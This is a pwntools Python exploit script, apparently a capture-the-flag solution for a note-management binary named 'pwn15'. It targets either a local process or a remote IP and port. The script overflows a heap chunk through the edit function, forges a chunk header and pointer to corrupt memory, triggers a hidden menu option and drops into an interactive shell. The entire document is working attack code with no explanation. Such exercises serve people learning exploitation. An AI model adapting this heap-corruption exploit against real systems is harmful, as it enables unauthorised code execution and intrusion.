from pwn import *

local  = 1
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./pwn15")
else:
    a=remote("50.3.232.201",31280)
def debug():
    gdb.attach(a,'''
    
    ''')
def menu(idx):
    a.recvuntil("Your choice:")
    a.sendline(str(idx))
def add(size,content):
    menu(1)
    a.recvuntil("Length of note:")
    a.sendline(str(size))
    a.recvuntil("Content of note:")
    a.send(content)
def delete(idx):
    menu(3)
    a.recvuntil("Index:")
    a.sendline(str(idx))
def edit(idx,size,content):
    menu(2)
    a.recvuntil("Index:")
    a.sendline(str(idx))
    a.recvuntil("Length of note:")
    a.sendline(str(size))
    a.recvuntil("Content of note:")
    a.send(content)
add(0x18,'A')
add(0x100,'A')
add(0x10,'A')
delete(1)
edit(0,0x100,'A'*0x18+p64(0x111)+p64(0)+p64(0x000000000602088-0x10))
#debug()
add(0x100,'A')
menu(2019)
#a.sendline("cat flag")
a.interactive()